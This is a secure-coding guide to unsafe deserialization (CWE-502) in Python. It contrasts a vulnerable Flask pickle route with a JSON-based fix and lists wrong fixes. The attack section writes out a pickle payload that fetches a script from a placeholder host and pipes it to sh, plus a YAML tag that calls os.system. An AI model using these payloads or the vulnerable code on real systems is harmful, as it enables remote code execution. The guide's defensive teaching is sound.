# CWE-502: Unsafe Deserialization

## What it is

Unsafe deserialization (CWE-502) happens when a program turns untrusted bytes back into Python objects using a format that can create arbitrary objects or run code while loading. In Python the dangerous calls are `pickle.loads` and `pickle.load` (and tools built on pickle such as `shelve`, `dill`, `jsonpickle` and `pandas.read_pickle`), `yaml.load` with any loader other than `SafeLoader`/`CSafeLoader`, `yaml.unsafe_load`, and `marshal.loads`. A pickle is effectively a small program: while it is being loaded it can import any module and call any function. Untrusted sources include request bodies, uploaded files, cookies, message queues, shared caches and files in folders other users can write to.

## How attackers exploit it

An attacker exploits unsafe deserialization by sending a crafted payload in place of the expected data. With pickle, a class whose `__reduce__` returns `(os.system, ("curl evil.example/x | sh",))` produces bytes that run that command the moment `pickle.loads` reads them; nothing has to be done with the result afterwards. Base64-encoding the pickle in a cookie or form field does not help, because the attacker encodes their own payload the same way. With `yaml.load(data, Loader=yaml.Loader)`, tags such as `!!python/object/apply:os.system ["id"]` call functions while the document is parsed. Malformed `marshal` data can crash the interpreter or smuggle in code objects. The usual result of unsafe deserialization is remote code execution as the application user.

## How to fix it in Python

To fix unsafe deserialization, switch to a data-only format and parser:

- Replace `pickle.loads(data)` with `json.loads(data)` and `pickle.load(f)` with `json.load(f)`. `json.loads` accepts both `str` and UTF-8 `bytes`; open text files with `encoding="utf-8"`.
- The code that writes the data must switch from `pickle.dumps` to `json.dumps` to match.
- Replace `yaml.load(text, Loader=yaml.Loader)`, `FullLoader` or `yaml.unsafe_load` with `yaml.safe_load(text)`, which only builds dicts, lists, strings, numbers, booleans and None.
- Replace `marshal.loads` on outside data with `json.loads`.
- After loading, check the shape: `isinstance(obj, dict)` and the required keys.
- JSON has no sets, tuples, bytes or datetimes; convert them (for example `isoformat()` and `datetime.fromisoformat()`) if the old code relied on them.
- If the client must not change the data (for example a cookie), sign it with `hmac` or use Flask's signed `session`.
- Pickle is acceptable only for files the application wrote itself and no one else can modify.

## Unsafe example

This unsafe deserialization example loads a pickle sent by the client:

```python
import base64
import pickle
from flask import Flask, request

app = Flask(__name__)

@app.route("/layout", methods=["POST"])
def save_layout():
    layout = pickle.loads(base64.b64decode(request.form["layout"]))
    return {"widgets": len(layout["widgets"])}
```

Any client can post a crafted pickle whose `__reduce__` method runs a shell command inside `pickle.loads`, before the code checks anything. The base64 step only changes the transport encoding; it is not a safeguard.

## Safe example

The unsafe deserialization fix parses the same field as JSON, which can only produce plain data:

```python
import base64
import json
from flask import Flask, request

app = Flask(__name__)

@app.route("/layout", methods=["POST"])
def save_layout():
    layout = json.loads(base64.b64decode(request.form["layout"]))
    if not isinstance(layout, dict) or not isinstance(layout.get("widgets"), list):
        return {"error": "invalid layout"}, 400
    return {"widgets": len(layout["widgets"])}
```

The route, parameters and response stay the same for valid input; the client now sends base64-encoded `json.dumps(layout)` instead of a pickle. For YAML input the equivalent change is usually one line: `yaml.load(text, Loader=yaml.Loader)` becomes `yaml.safe_load(text)`.

## Common wrong fixes

These changes look like unsafe deserialization fixes but remain exploitable:

- Base64-encoding, compressing, or encrypting the pickle with a key stored in the code.
- Checking the type of the result after `pickle.loads`; the payload already ran during loading.
- Subclassing `pickle.Unpickler` with a blacklist of "dangerous" modules; bypasses are common.
- Switching to `yaml.load(..., Loader=yaml.FullLoader)`, `yaml.unsafe_load`, `jsonpickle`, `dill` or `shelve`, which still build arbitrary objects.
- Replacing the loader with `eval(data)`, which runs code directly.
- Wrapping `pickle.loads` in try/except.
- Adding `# nosec`, or deleting the import or upload feature.

## Checklist for a correct fix

Before accepting an unsafe deserialization fix, confirm:

- No `pickle.loads`, `pickle.load`, `marshal.loads`, `yaml.unsafe_load`, or `yaml.load` with an unsafe loader touches outside data.
- The replacement is `json.loads` / `json.load` or `yaml.safe_load`.
- The loaded value is checked for the expected type and keys before use.
- The note says which writer (sender, cookie setter, export code) must switch to `json.dumps`.
- The function keeps its name, parameters and return value for valid input.
- Only stdlib `json` or the already-installed `yaml` is imported; no `eval`, no `exec`, no `# nosec`.
